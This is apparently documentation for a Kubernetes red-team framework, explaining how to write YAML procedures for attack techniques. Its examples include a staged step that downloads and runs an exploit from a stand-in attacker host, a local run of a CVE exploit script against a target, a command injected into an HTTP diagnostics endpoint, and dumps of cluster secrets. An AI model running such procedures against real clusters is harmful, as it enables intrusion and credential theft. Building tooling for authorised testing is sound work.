# Writing Procedures

A TTP can declare one or more procedures — different ways to execute the same
technique. The operator (or agent) picks one at invocation time.

## Shell command

The simplest procedure: a shell command to run on the target.

```yaml
parameters:
  K8S_AUTH:
    type: K8sAuth
    description: The Kubernetes identity selected by Authenticate As
procedures:
  - key: kubectl
    command: kubectl ${K8S_AUTH} get pods -n=${NS} --output=json
```

- `key` — display name for the procedure, shown in the UI and used as the procedure
  ID. Also sets the preferred tool: if `key` matches a known tool TTP (e.g. `curl`,
  `wget`), that tool's setup steps are prepended automatically.
- `command` — the shell command to execute. Parameter placeholders (`${VAR}`) are
  resolved at runtime.

### Local commands

Some procedures run on the **operator's machine** rather than inside the target pod.
Set `isLocal: true`:

```yaml
procedures:
  - key: python-poc
    isLocal: true
    command: python3 /opt/exploits/cve-2025-1974.py --target ${TARGET.IP}
```

## Structured K8s API request

Use `k8s_request:` to describe a Kubernetes API call. Authentication remains
explicit through the required `${K8S_AUTH}` marker, while its value comes from
the action's Authenticate As selection.

```yaml
parameters:
  K8S_AUTH:
    type: K8sAuth
    description: The Kubernetes identity selected by Authenticate As
procedures:
  - key: k8s-request
    k8s_request:
      authentication: ${K8S_AUTH}
      api_server: ${API_SERVER}
      api: /api/v1
      resource: serviceaccounts
      namespace: ${NS}
      cluster_scoped: ${ALL_NS}
      query: limit=500
      use_ca: false
```

| Field | Description |
|---|---|
| `authentication` | Required `${K8S_AUTH}` marker resolved from Authenticate As |
| `api_server` | Base URL of the Kubernetes API server |
| `api` | API group path (e.g. `/api/v1`, `/apis/apps/v1`) |
| `resource` | Resource type (e.g. `pods`, `secrets`) |
| `namespace` | Namespace to query; ignored if `cluster_scoped` is true |
| `cluster_scoped` | `true` to query all namespaces |
| `query` | Optional query string appended to the URL |
| `use_ca` | Whether to validate the server CA certificate |

The selected **Authenticate As** identity supplies authentication. Every
kubectl invocation must contain `${K8S_AUTH}`; it expands to either a
ServiceAccount `--token` flag or `--kubeconfig "$KUBECONFIG"`.
Local control procedures that directly use the active Kubernetes client are
exempt when they do not reference `${K8S_AUTH}`.

## Structured HTTP request

Use `http_request:` for arbitrary HTTP calls:

```yaml
procedures:
  - key: curl
    tool: curl
    http_request:
      method: POST
      url: http://${TARGET}:${PORT}/api/v1/diagnostics/run
      headers:
        Content-Type: application/json
      body: '{"command":"${CMD}"}'
```

| Field | Description |
|---|---|
| `method` | HTTP method (`GET`, `POST`, `PUT`, `DELETE`, …) |
| `url` | Full URL with parameter placeholders |
| `headers` | Map of header name → value |
| `body` | Request body string |

For a direct Kubernetes API request that must remain a general HTTP procedure,
declare a `K8S_AUTH` parameter of type `K8sAuth`, set
`authentication: ${K8S_AUTH}`, and omit the `Authorization` header. Ran
injects the bearer header for a selected ServiceAccount or routes the request
through the active Kubernetes client for a selected K8sCredential. This keeps
both the HTTP transport and its authentication dependency explicit without
restoring a `TOKEN` parameter.

The `tool:` field on the procedure specifies which CLI tool should handle the
request (`curl`, `wget`). If omitted, Ran uses its built-in HTTP client.

## Step sequences

Use `steps:` for ordered multi-phase operations (download → compile → execute):

```yaml
procedures:
  - key: staged-exploit
    steps:
      - fetch:
          url: https://attacker.example/exploit
          dest: /tmp/exploit
      - chmod:
          path: /tmp/exploit
          mode: "0755"
      - run:
          command: /tmp/exploit --payload ${CMD}
```

Step types: `fetch`, `chmod`, `run`, `write`, `delete`. The runtime compiles the
steps into a shell snippet joined with `&&`.

## Multiple procedures in one TTP

List as many procedures as you want. The UI renders them as a selectable list.
Prefer offering at least two where practical — one using native Kubernetes tooling
(`kubectl`) and one that only requires network access (`curl`):

```yaml
parameters:
  K8S_AUTH:
    type: K8sAuth
    description: The Kubernetes identity selected by Authenticate As
procedures:
  - key: kubectl
    command: kubectl ${K8S_AUTH} get secrets -n=${NS} -o json

  - key: k8s-request
    k8s_request:
      authentication: ${K8S_AUTH}
      api_server: ${API_SERVER}
      api: /api/v1
      resource: secrets
      namespace: ${NS}
```
